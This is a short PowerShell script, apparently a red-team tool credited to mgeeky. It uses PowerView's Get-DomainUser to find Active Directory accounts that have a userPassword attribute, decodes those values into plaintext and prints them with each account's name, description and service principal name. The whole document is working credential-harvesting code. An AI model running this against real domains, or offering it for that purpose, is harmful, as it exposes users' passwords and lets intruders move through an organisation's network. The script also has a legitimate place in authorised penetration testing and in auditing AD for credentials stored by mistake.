<#
  This script enumerates user accounts in Active Directory and then collects
  their .userPassword properties, decodes them and prints out.
 
  Assuming we have PowerView's Get-DomainUser command available.

  Usage:
    PS> . .\Get-UserPasswordEntries.ps1
    PS> Get-UserPasswordEntries
  
  Mariusz Banach / mgeeky
#>

# This script requires PowerView 3.0 dev branch
# Import-Module powerview.ps1 -ErrorAction SilentlyContinue

Function Get-UserPasswordEntries 
{
    $num = 0

    Get-DomainUser -Filter "(userpassword=*)" -Properties * | % {
        $entry = $_
        $passw = $entry | Select -ExpandProperty userpassword
        $passw2 = $passw | % {[char][int]$_}
        $passw3 = $passw2 -join ''
        $name1 = $entry.samaccountname
        try {
            $desc = $entry.description
        }
        catch {
            $desc = "<empty>"
        }
        
        try {
            $name3 = $entry.serviceprincipalname
        }
        catch {
            $name3 = "<empty>"
        }

        $num += 1

        $obj = @{
            SamAccountName = $name1
            ServicePrincipalName = $name3
            Description = $desc
            UserPassword = $passw3
        }
        $object = new-object psobject -Property $obj
        
        Write-Host $num".)"
        Write-Host "SamAccountName:`t`t" $object.SamAccountName
        Write-Host "Description:`t`t" $object.Description
        Write-Host "ServicePrincipalName:`t" $object.ServicePrincipalName
        Write-Host "UserPassword:`t`t" $object.UserPassword
        Write-Host
    }

    Write-Host "Found in total: "$num" entries."
}